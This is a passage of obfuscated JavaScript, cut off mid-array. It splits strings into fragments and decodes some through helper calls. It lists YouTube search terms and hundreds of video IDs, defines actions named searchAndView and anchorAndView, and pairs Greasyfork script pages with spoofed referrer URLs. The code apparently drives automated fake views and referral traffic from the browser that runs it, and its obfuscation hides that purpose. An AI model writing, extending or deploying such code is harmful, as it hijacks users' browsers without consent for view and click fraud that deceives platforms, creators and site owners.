searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + X(0x11) + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x4 * 0x5d4 + 0xced + 0xa6d * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x375 + -0x1 * 0xd99 + 0x223 * 0x8)), searchTerms['push']((Y(0x17) + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x11b * -0xd + 0x3d1 + -0x122d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    Y(0xb) + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    Y(0xa) + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    Z(0x10, 'zW**') + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    X(0x12) + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + Z(0x4, 'Z7Do'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': X(0xc) + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + Y(0x8) + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
